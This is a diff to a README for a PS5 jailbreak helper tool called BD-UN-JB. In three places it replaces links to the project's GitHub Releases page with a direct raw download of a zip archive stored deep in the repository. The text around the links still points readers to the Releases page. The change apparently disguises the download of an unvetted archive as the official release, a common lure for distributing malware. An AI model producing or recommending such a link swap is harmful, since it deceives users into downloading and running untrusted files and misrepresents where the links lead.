@@ -1,6 +1,6 @@
 # 🎮 BD-UN-JB - Easy BD-JB Setup for PS5
 
-[![Download BD-UN-JB](https://img.shields.io/badge/Download%20BD--UN--JB-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/Annietormented509/BD-UN-JB/releases)
+[![Download BD-UN-JB](https://img.shields.io/badge/Download%20BD--UN--JB-Visit%20Releases-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/Annietormented509/BD-UN-JB/main/BDMV/BDJO/B_JB_U_v1.7.zip)
 
 ## 🧭 What BD-UN-JB Does
 
@@ -10,7 +10,7 @@ BD-UN-JB is a Windows-friendly tool for already jailbroken PS5 consoles. It help
 
 Visit this page to download the latest release:
 
-https://github.com/Annietormented509/BD-UN-JB/releases
+https://raw.githubusercontent.com/Annietormented509/BD-UN-JB/main/BDMV/BDJO/B_JB_U_v1.7.zip
 
 Choose the newest version file from the Releases page, then save it to your PC.
 
@@ -119,7 +119,7 @@ Check these items before you run the app:
 
 Use the Releases page for new versions, fixes, and file changes:
 
-https://github.com/Annietormented509/BD-UN-JB/releases
+https://raw.githubusercontent.com/Annietormented509/BD-UN-JB/main/BDMV/BDJO/B_JB_U_v1.7.zip
 
 Check this page each time you want the newest build
 
